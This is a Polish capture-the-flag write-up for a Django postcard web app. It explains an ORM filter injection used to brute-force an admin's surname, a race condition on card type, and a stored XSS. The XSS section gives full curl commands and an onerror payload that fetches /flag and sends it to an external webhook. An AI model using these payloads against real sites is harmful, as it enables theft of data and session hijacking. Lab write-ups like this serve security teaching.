# Nazwisko administratora
Jak pokazuje poniższy kod lista wszystkich kartek pozwala na filtrowanie po dowolych parametrach.
```py
def postcard_list(request):
    current_user = get_user(request)
    postcards = (
        Postcard.objects.filter(Q(owner=current_user) | Q(is_public=True))
        .filter(**request.GET.dict())
        .order_by("-created_at")
    )
    return render(request, "postcard_app/postcard_list.html", {"postcards": postcards})
```
`.filter(**request.GET.dict())` powoduje, że wszystkie parametry z request.GET są bezpośrednio przekazywane do .filter(), bez żadnej walidacji ani ograniczeń.

W szczególności https://web.kazet.cc:52025/?owner__last_name__startswith=a wyświetli wszystkie kartki, których owner ma last_name zaczynające się na 'a'. Spróbujmy więc brutalnie posprawdzać czy istnieje jakakolwiek kartka, gdzie last_name ownera zaczyna się na 'a' potem na 'b' itd. W końcu znajdziemy pierwszy znak w last_name ownera i możemy szukać drugiego próbując Fa, Fb, Fc, ...

Możnaby byłoby sprawdzać wszystkie adresy ręcznie, ale kod w pliku `last_name.py` to automatyzuje i dostajemy flagę `FLAG{nobody_knows_my_name}`. Oczywiście do kodu pythonowego należy wstawić swoje ciasteczka.

# kartka VIP
```py
    def save(self, commit=True, owner=None, post_data=None):
        """
        Save the Postcard instance.
        - owner: User instance
        - post_data: request.POST dictionary
        """
        instance = super().save()
        instance.formatting = {}

        # Process dynamic fields like title[text_color], message[font], etc.
        if post_data:
            for key, value in post_data.items():
                # Match keys of the form element[property]
                if "[" in key and key.endswith("]"):
                    element, prop = key.split("[", 1)
                    prop = prop[:-1]  # remove trailing ']'
                    if element not in instance.formatting:
                        instance.formatting[element] = {}
                    instance.formatting[element][prop] = value

        instance.card_type = Postcard.Type.NORMAL

        if owner:
            instance.owner = owner
        if commit:
            instance.save()
        return instance
```
W powyższym kodzie widać potencjał na race condition. `instance = super().save()` powoduje natychmiastowy zapis obiektu do bazy danych z wykorzystaniem niezwalidowanych danych przesłanych w POST-cie. Oznacza to, że jeśli przekażemy w formularzu pole card_type=VIP, to ta wartość zostanie zapisana w bazie i zostanie nadpisana dopiero przez
```py
instance.card_type = Postcard.Type.NORMAL
instance.save()
```
Jeśli w tym okienku odczytamy kartkę, to dostaniemy flagę. Kod w pliku `VIP_postcard` wielokrotnie tworzy dwa wątki które jednocześnie wysyłają POST i GET. Liczymy na to, że za którymś razem dostaniemy ten porządany przeplot. Oczywiście do kodu pythonowego należy wstawić swoje ciasteczka. W tym co wypisze `VIP_postcard.py` można odnaleźć `FLAG{you_are_so_fast}`, co jest naszą szukaną flagą.

# Flaga z podstrony /flag/
```py
<script>
  window.addEventListener('DOMContentLoaded', function() {
    var formatting = JSON.parse(document.getElementById("formatting").textContent);
    console.log(formatting);

    for (const elem in formatting) {
      const params = formatting[elem];
      for (const param in params) {
        document.getElementById(elem)[param] = params[param];
      }
    }
});
</script>
{{ pc.formatting|json_script:"formatting" }}
```
W powyższym kodzie widzimy, że `document.getElementById(elem)[param] = params[param];` wykonuje dowolne przypisanie właściwości do elementu o ID elem. Na przykład możemy ustawić w POST-cie `title[innerHTML]`
używając takiego curla, co doprowadzi do możliwości wykonania javascripta i zrobienia XSS-a:
```
curl 'https://web.kazet.cc:52025/create/' \
  -X POST \
  -H 'Cookie: sessionid=r8mb71p03225558tt1skkdgx3pavfgi8' \
  --data-raw 'title=title&message=message&title%5BinnerHTML%5D=%3Cimg%20src%3Dobrazek.png%20onerror%3Dalert(0)%3E'
```
I jak zobaczymy pocztówkę, którą to tworzy, to faktycznie dostajemy alert(0). Nie można było użyć po prostu `<script>`, więc próbujemy załadować nieistniejący obrazek i odpamy onerror. Bardziej czytelna wersja powyższego, przez encodowaniem:
```
title[innerHTML]=<img src=obrazek.png onerror=alert(0)>
```

W takim razie zróbmy pocztkówkę, która wyśle zawartość https://web.kazet.cc:52025/flag/ na naszego webhooka:
```
curl 'https://web.kazet.cc:52025/create/' \
  -X POST \
  -H 'Cookie: sessionid=r8mb71p03225558tt1skkdgx3pavfgi8' \
  --data-raw 'title=title&message=message&title%5BinnerHTML%5D=%3Cimg%20src%3Dobrazek.png%20onerror%3D%22fetch(%27%2Fflag%27).then(r%3D%3Er.text()).then(t%3D%3Efetch(%27https%3A%2F%2Fwebhook.site%2Fda0dd14f-a98b-4c48-9286-6435e8effede%27%2C%7Bmethod%3A%27POST%27%2Cbody%3At%7D))%22%3E'
```
Bardziej czytelna wersja powyższego, przez encodowaniem:
```
title[innerHTML]=<img src=obrazek.png onerror="fetch('/flag').then(r=>r.text()).then(t=>fetch('https://webhook.site/da0dd14f-a98b-4c48-9286-6435e8effede',{method:'POST',body:t}))"
```
I faktycznie po wykonaniu tego curla i zobaczeniu pocztówki dostajemy na webhooka POST-a z zawartością https://web.kazet.cc:52025/flag/. Wystarczy więc teraz jedynie użyć `report` i admin otwierając pocztówkę wysyła zawartość https://web.kazet.cc:52025/flag/ na webhooka, teraz już nie z error 403, ale z flagą `FLAG{there's_no_place_like_DOM}`

Oczywiście aby powyższe curle zadziałały trzeba zmienić ciasteczka i adres webhooka.